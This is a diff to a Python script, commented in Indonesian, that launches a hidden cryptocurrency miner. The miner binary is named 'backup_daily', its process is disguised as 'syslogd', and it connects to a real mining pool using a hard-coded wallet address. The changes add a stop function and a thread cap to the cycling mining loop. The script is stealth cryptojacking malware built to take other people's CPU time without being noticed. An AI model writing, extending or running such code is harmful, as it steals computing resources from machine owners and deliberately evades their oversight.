@@ -31,9 +31,17 @@ def get_numa_info():
         print(f"Error mendapatkan info NUMA: {e}")
         return {}
 
+def stop_mining():
+    """Menghentikan semua proses mining"""
+    try:
+        subprocess.run("pkill -f backup_daily", shell=True)
+        print("Semua proses mining telah dihentikan.")
+    except Exception as e:
+        print(f"Gagal menghentikan mining: {e}")
+
 def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
     """Menjalankan proses mining dengan NUMA terbatas dan hidden process tanpa cpulimit"""
-    set_process_name("syslogd")  # Ubah nama proses agar tidak mencurigakan
+    set_process_name("syslogd")
     numa_info = get_numa_info()
     
     if numa_node not in numa_info:
@@ -45,13 +53,13 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
     selected_cpus = ",".join(map(str, numa_info[numa_node][:limited_cpus]))
     
     threads = initial_threads
+    max_threads = total_cpus  # Batasi jumlah maksimum thread sesuai dengan jumlah CPU yang tersedia
     
-    while True:
+    while threads <= max_threads:
         command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
         
         print(f"Menjalankan mining secara tersembunyi pada NUMA node {numa_node} dengan {limited_cpus}/{total_cpus} CPU ({limit_percent}%) dan {threads} thread")
         
-        # Buat skrip sementara untuk menjalankan mining dengan nama lain
         script_content = f"""#!/bin/bash
         exec -a syslogd {command}
         """
@@ -61,8 +69,7 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
             script_file.write(script_content)
         os.chmod(script_path, 0o755)
         
-        # Jalankan proses mining dengan NUMA binding tanpa cpulimit
-        subprocess.Popen(
+        mining_process = subprocess.Popen(
             f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {script_path} > /dev/null 2>&1 &",
             shell=True
         )
@@ -71,6 +78,8 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
         time.sleep(sleep_time)
         
         print(f"Mining dihentikan selama {sleep_time} detik. Melanjutkan dalam 10 detik...")
+        stop_mining()  # Hentikan proses mining sebelum jeda
+        
         time.sleep(10)
         
         threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
